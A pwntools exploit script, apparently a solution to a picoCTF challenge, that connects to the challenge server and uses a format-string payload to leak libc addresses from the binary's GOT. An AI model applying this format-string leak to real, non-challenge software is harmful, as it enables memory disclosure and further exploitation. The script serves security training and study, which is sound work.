#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("jupiter.challenges.picoctf.org", 57529)

    return r

def main():

    r = conn()

    ''' GOT (FOR REFERENCE)
    [0x8049fc8] printf@GLIBC_2.0  →  0xf7ddb520
    [0x8049fcc] gets@GLIBC_2.0  →  0xf7df5ee0
    [0x8049fd0] fgets@GLIBC_2.0  →  0xf7df4ce0
    [0x8049fd4] __stack_chk_fail@GLIBC_2.4  →  0xf7eb5020
    [0x8049fd8] getegid@GLIBC_2.0  →  0xf7e61ce0
    [0x8049fdc] puts@GLIBC_2.0  →  0xf7df6880
    [0x8049fe0] __libc_start_main@GLIBC_2.0  →  0xf7da5560
    [0x8049fe4] atol@GLIBC_2.0  →  0xf7dbca00
    [0x8049fe8] setvbuf@GLIBC_2.0  →  0xf7df6f80
    [0x8049fec] setresgid@GLIBC_2.0  →  0xf7e62140
    '''

    # Found using guess_ans.py
    ans = -3727 # Offset of libc.rand is -3727 + 4096 + 1 = 0x172
    #ans = YOUR_LOCAL_ANS # If testing locally (with an unpatched `vuln`), enter the answer for your local process here

    # gdb shows that the GOT starts with printf and has 10 entries 
    # (leaking 2 is enough to narrow the version of libc used to either libc6-i386_2.27-3ubuntu1.5_amd64 or libc6-i386_2.27-3ubuntu1.6_amd64)
    got_start_addr = exe.got.printf
    got_funcs = ['printf', 'gets', 'fgets', '__stack_chk_fail', 'getegid'] # Add more if required

    for i in range(len(got_funcs)):
        r.sendlineafter(b'guess?\n', str(ans).encode())

        # By trial-and-error, fmtstr_offset = 7
        r.sendlineafter(b'Name? ', b'%8$s'+p32(got_start_addr + i*4))
        func_addr = u32(r.recvuntil(b'\n\n')[10:14])
        
        log.info(f"{got_funcs[i]} addr: {hex(func_addr)}")

if __name__ == "__main__":
    main()
